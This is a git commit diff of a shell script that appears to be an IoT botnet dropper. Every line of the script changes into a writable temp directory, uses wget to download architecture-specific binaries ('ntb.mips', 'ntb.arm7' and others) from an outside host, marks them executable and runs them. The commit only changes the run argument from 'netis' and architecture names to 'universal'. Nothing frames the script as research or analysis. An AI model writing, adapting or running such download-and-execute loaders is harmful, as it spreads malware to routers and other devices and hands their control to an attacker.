b865a946f3f07d6930e266be728711e87ad08c9a
urBenm4 <138570858+urBenm4@users.noreply.github.com>
2026-06-13 09:32:05 +0400

    Update run.sh to use 'universal' for architecture

--- wow/old/run.sh
+++ wow/old/run.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 ulimit -n 1024 2>/dev/null || true
 cp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /var/run/ || cp /bin/busybox /run/ || cp /bin/busybox /dev/shm/ || cp /bin/busybox /mnt/ || cp /bin/busybox /root/ || cp /bin/busybox /opt/ || cp /bin/busybox /var/ || cp /bin/busybox /home/ || true
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mips; chmod 777 ntb.mips; ./ntb.mips netis
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mipsel; chmod 777 ntb.mipsel; ./ntb.mipsel netis
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm64; chmod 777 ntb.arm64; ./ntb.mips arm64
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm6; chmod 777 ntb.arm6; ./ntb.mips arm6
-cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm7; chmod 777 ntb.arm7; ./ntb.mips arm7
+cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mips; chmod 777 ntb.mips; ./ntb.mips universal
+cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.mipsel; chmod 777 ntb.mipsel; ./ntb.mipsel universal
+cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm64; chmod 777 ntb.arm64; ./ntb.mips universal
+cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm6; chmod 777 ntb.arm6; ./ntb.mips universal
+cd /tmp || cd /var/tmp || cd /var/run || cd /run || cd /dev/shm || cd /mnt || cd /root || cd /opt || cd /var || cd /home || cd /; wget http://store.risesmp.cc/wow/ntb.arm7; chmod 777 ntb.arm7; ./ntb.mips universal
